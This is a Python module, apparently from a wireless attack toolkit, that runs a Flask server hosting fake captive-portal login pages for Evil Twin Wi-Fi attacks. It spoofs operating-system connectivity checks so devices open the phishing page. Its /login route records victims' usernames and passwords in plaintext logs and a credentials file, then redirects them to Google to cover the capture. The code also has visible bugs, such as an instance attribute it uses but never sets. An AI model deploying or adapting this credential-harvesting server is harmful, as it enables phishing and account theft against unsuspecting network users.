# src/core/web_server_manager.py
"""
Web Server Manager: Hosts fake login pages for Evil Twin attacks and captures credentials.
Utilizes the Flask micro-framework.
"""

import os
import threading
import time
import shutil
import json
import tempfile
from typing import Optional, Dict, Any, Callable, Tuple, Union, cast # <--- CRITICAL FIX: Import 'cast'


# CRITICAL FIX: Import Flask components directly, including Response and make_response
from flask import Flask, request, send_from_directory, redirect, Response, make_response


from core.logger import logger
from paths import CAPGATE_WEB_TEMPLATES_DIR, CAPGATE_CREDENTIALS_FILE


# --- Global/Module-level Flask app instance and variables ---
_flask_app: Flask = Flask(
    __name__, 
    root_path=str(CAPGATE_WEB_TEMPLATES_DIR),
    template_folder=str(CAPGATE_WEB_TEMPLATES_DIR),
    static_folder=None
)
_credentials_file_path_global: Optional[str] = str(CAPGATE_CREDENTIALS_FILE)
_captured_credentials_callback_global: Optional[Callable[[Dict[str, Any]], None]] = None
_logger_ref = logger


# --- Flask Routes and Logic ---

@_flask_app.route('/generate_204')
def generate_204() -> Response:
    _logger_ref.debug("[WebServer] Spoofing connectivity check: /generate_204")
    return make_response("", 204)

@_flask_app.route('/hotspot-detect.html')
def hotspot_detect() -> Response:
    _logger_ref.debug("[WebServer] Spoofing connectivity check: /hotspot-detect.html")
    return send_from_directory(directory=_flask_app.root_path, path='hotspot-detect.html')

@_flask_app.route('/ncsi.txt')
def ncsi_txt() -> Response:
    _logger_ref.debug("[WebServer] Spoofing connectivity check: /ncsi.txt")
    return send_from_directory(directory=_flask_app.root_path, path='ncsi.txt')

@_flask_app.route('/connecttest.txt')
def connect_test_txt() -> Response:
    _logger_ref.debug("[WebServer] Spoofing connectivity check: /connecttest.txt")
    return send_from_directory(directory=_flask_app.root_path, path='connecttest.txt')
        
@_flask_app.route('/redirect')
def generic_redirect() -> Response:
    _logger_ref.debug("[WebServer] Spoofing connectivity check: /redirect")
    return make_response("", 204)


@_flask_app.route('/')
def index() -> Response:
    _logger_ref.debug("[WebServer] Serving index.html")
    return send_from_directory(directory=_flask_app.root_path, path='index.html')


@_flask_app.route('/login', methods=['POST']) 
def login_handler() -> Union[Response, Tuple[str, int]]: # Return type is Response or Tuple[str, int] for the 400 case
    _logger_ref.info("[WebServer] Received POST to /login")

    username: str = request.form.get('username', request.form.get('user', ''))
    password: str = request.form.get('password', request.form.get('pass', ''))

    if username and password:
        captured_creds: Dict[str, Any] = {"username": username, "password": password, "timestamp": time.time()}
        _logger_ref.info(f"[WebServer] Captured credentials: User='{username}', Pass='{password}'")

        if _credentials_file_path_global:
            try:
                with open(_credentials_file_path_global, 'a', encoding='utf-8') as f:
                    f.write(json.dumps(captured_creds) + '\n')
                _logger_ref.info("[WebServer] Credentials written to file.")
            except IOError as e:
                _logger_ref.error(f"[WebServer] Failed to write credentials to file: {e}")

        if _captured_credentials_callback_global:
            try:
                _captured_credentials_callback_global(captured_creds)
                _logger_ref.debug("[WebServer] Credentials callback executed.")
            except Exception as e:
                _logger_ref.error(f"[WebServer] Error in credentials callback: {e}")

        return cast(Response, redirect("http://www.google.com/")) # <--- Apply cast
    _logger_ref.warning("[WebServer] Login attempt with missing username or password.")
    return make_response("Username or password not provided.", 400) # <--- Removed unnecessary cast


@_flask_app.route('/<path:filename>')
def serve_static(filename: str) -> Response:
    _logger_ref.debug(f"[WebServer] Serving static file: {filename}")
    return send_from_directory(directory=_flask_app.root_path, path=filename)


class WebServerManager:
    """
    Manages the lifecycle of the Flask web server for Evil Twin attacks.
    """
    def __init__(self):
        self.logger = logger
        self._httpd_thread: Optional[threading.Thread] = None
        self._server_shutdown_event: threading.Event = threading.Event()
        self._listen_ip: str = "0.0.0.0"
        self._listen_port: int = 80
        self._doc_root_path: str = "" # Actual temporary directory Flask will serve from

        global _credentials_file_path_global
        _credentials_file_path_global = str(CAPGATE_CREDENTIALS_FILE) 


    def _prepare_web_root_files(self) -> bool:
        """
        Copies web templates and necessary files to a temporary server's document root.
        This temporary root will be used as Flask's `root_path` for this specific `start_webserver` call.
        """
        self._doc_root_path = os.path.join(tempfile.gettempdir(), f"capgate_web_root_run_{os.getpid()}_{int(time.time())}")
        os.makedirs(self._doc_root_path, exist_ok=True)
        self.logger.debug(f"[WebServer] Temporary web root created at: {self._doc_root_path}")

        try:
            for item_name in os.listdir(CAPGATE_WEB_TEMPLATES_DIR):
                src_path = os.path.join(CAPGATE_WEB_TEMPLATES_DIR, item_name)
                dst_path = os.path.join(self._doc_root_path, item_name)
                if os.path.isfile(src_path):
                    shutil.copy2(src_path, dst_path)
                elif os.path.isdir(src_path):
                    shutil.copytree(src_path, dst_path, dirs_exist_ok=True)
            self.logger.debug(f"[WebServer] Copied web templates to {self._doc_root_path}")

        except Exception as e:
            self.logger.error("[WebServer] Failed to prepare web root files: %s", e)
            if self._doc_root_path and os.path.exists(self._doc_root_path):
                shutil.rmtree(self._doc_root_path, ignore_errors=True)
            return False

        return True

    def start_webserver(
        self,
        listen_ip: str,
        listen_port: int = 80,
        credentials_capture_callback: Optional[Callable[[Dict[str, Any]], None]] = None
    ) -> bool:
        """
        Starts the web server to host fake login pages.

        Args:
            listen_ip (str): The IP address the web server should bind to.
            listen_port (int): The port the web server should listen on.
            credentials_capture_callback (Optional[Callable]): Callback for captured credentials.

        Returns:
            bool: True if the web server started successfully, False otherwise.
        """
        self.logger.info("[WebServer] Starting web server on %s:%d...", listen_ip, listen_port)
        if self._httpd_thread and self._httpd_thread.is_alive():
            self.logger.warning("[WebServer] Web server is already running. Stopping existing server before starting a new one.")
            self.stop_webserver()

        self._listen_ip = listen_ip
        self._listen_port = listen_port

        global _captured_credentials_callback_global
        _captured_credentials_callback_global = credentials_capture_callback

        if not self._prepare_web_root_files():
            self.logger.error("[WebServer] Failed to prepare web root files.")
            return False

        _flask_app.root_path = self._doc_root_path
        _flask_app.template_folder = self._doc_root_path

        try:
            self._server_shutdown_event.clear()
            self._httpd_thread = threading.Thread(
                target=self._run_flask_app_in_thread,
                daemon=True
            )
            self._httpd_thread.start()

            self.logger.info("[WebServer] Web server started on %s:%d (serving from %s).", self._listen_ip, self._listen_port, self._doc_root_path)
            time.sleep(2) # Give server a moment to spin up and bind

            if not self._httpd_thread.is_alive():
                self.logger.error("[WebServer] Web server thread died immediately after starting. Check for port conflicts or Flask errors.")
                return False

            return True
        except PermissionError:
            self.logger.error(f"[WebServer] Permission denied for port {self._listen_port}. Try running as root or choose a port > 1024.")
            if self._doc_root_path and os.path.exists(self._doc_root_path):
                shutil.rmtree(self._doc_root_path, ignore_errors=True)
            return False
        except Exception as e:
            self.logger.error(f"[WebServer] Failed to start web server on {self._listen_ip}:{self._listen_port}: {e}")
            if self._doc_root_path and os.path.exists(self._doc_root_path):
                shutil.rmtree(self._doc_root_path, ignore_errors=True)
            return False


    def _run_flask_app_in_thread(self) -> None:
        """Helper to run the Flask app within its own thread."""
        try:
            # Type of "_flask_app_instance" is "Optional[Flask]".
            # It implies _flask_app_instance could be None here.
            # But we just assigned it in start_webserver() and the thread is started.
            # This is a common Pylance false positive in threaded Flask setups.
            # We can add an assert or simply ignore as it's safe if flow is correct.
            # For strictness:
            if self._flask_app_instance is None: # This if check helps Pylance
                self.logger.error("[WebServer] Flask app instance is None in thread runner. This should not happen.")
                return # Exit early if something is very wrong.

            self._flask_app_instance.run( # Call run on the instance
                host=self._listen_ip,
                port=self._listen_port,
                debug=False,
                threaded=True,
                use_reloader=False
            )
            self.logger.info("[WebServer] Flask server thread finished.")
        except Exception as e:
            self.logger.error(f"[WebServer] Flask server thread encountered an error: {e}")
        finally:
            self._server_shutdown_event.set()


    def stop_webserver(self) -> bool:
        """
        Stops the running web server and cleans up temporary files.
        """
        self.logger.info("[WebServer] Attempting to stop web server...")
        if self._httpd_thread and self._httpd_thread.is_alive():
            try:
                import requests # Assuming 'requests' is installed
                requests.post(f"http://{self._listen_ip}:{self._listen_port}/shutdown_flask_server")
                self.logger.debug("[WebServer] Sent shutdown signal to Flask server.")
            except Exception as e:
                self.logger.warning(f"[WebServer] Could not send shutdown signal to Flask: {e}. Relying on thread join.")
            
            self.logger.debug("[WebServer] Waiting for Flask server thread to finish.")
            self._httpd_thread.join(timeout=5)

            if self._httpd_thread.is_alive():
                self.logger.warning("[WebServer] Flask server thread did not terminate gracefully after join.")
            else:
                self.logger.info("[WebServer] Flask server thread stopped.")
        elif self._httpd_thread:
            self.logger.info("[WebServer] Flask server thread was already stopped or not running.")
        else:
            self.logger.info("[WebServer] No active web server thread found to stop.")

        if self._doc_root_path and os.path.exists(self._doc_root_path):
            self.logger.debug("[WebServer] Removing temporary web root: %s", self._doc_root_path)
            try:
                shutil.rmtree(self._doc_root_path)
                self.logger.debug("[WebServer] Temporary web root removed.")
            except OSError as e:
                self.logger.warning("[WebServer] Could not remove temporary web root %s: %s", self._doc_root_path, e)
        else:
            self.logger.debug("[WebServer] No temporary web root path to remove or path does not exist.")

        global _credentials_file_path_global, _captured_credentials_callback_global
        _credentials_file_path_global = None
        _captured_credentials_callback_global = None
        self.logger.debug("[WebServer] Resetting global credentials file path and callback.")
        self._server_shutdown_event.set()
        self.logger.info("[WebServer] Web server stopped successfully.")
        self._httpd_thread = None # Reset thread reference
        global _flask_app_instance
        _flask_app_instance = None # Reset Flask app instance reference
        self.logger.debug("[WebServer] Resetting Flask app instance reference.")
        # Reset the Flask app instance reference
        if hasattr(self, '_flask_app_instance'):
            self.logger.debug("[WebServer] Resetting Flask app instance reference.")
            del self._flask_app_instance
        else:
            self.logger.debug("[WebServer] No Flask app instance reference to reset.")
        # Ensure the Flask app instance is reset
        global _flask_app
        _flask_app = Flask(
            __name__,
        )
        self._flask_app_instance = None # Reset Flask app instance reference

        return True

    def __del__(self):
        """
        Ensures the web server is stopped and temporary files are cleaned up on object deletion.
        """
        self.logger.debug("[WebServer] __del__ called for WebServerManager. Initiating cleanup...")
        if self._httpd_thread and self._httpd_thread.is_alive():
             self.stop_webserver()
        else:
             self.logger.debug("[WebServer] No active server to stop in __del__.")

        self.logger.debug("[WebServer] __del__ cleanup complete.")

# --- Flask Shutdown Route (REQUIRED for graceful shutdown from another thread) ---
# This route must be defined at the module level for the global _flask_app instance
@_flask_app.route('/shutdown_flask_server', methods=['POST'])
def shutdown_flask_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        _logger_ref.warning("[WebServer] Not running with the Werkzeug Server or no shutdown function found.")
        return "Not running with Werkzeug Server or no shutdown function.", 500
    _logger_ref.info("[WebServer] Received shutdown request. Shutting down Werkzeug server.")
    func() # Call the Werkzeug shutdown function
    return "Server shutting down...", 200
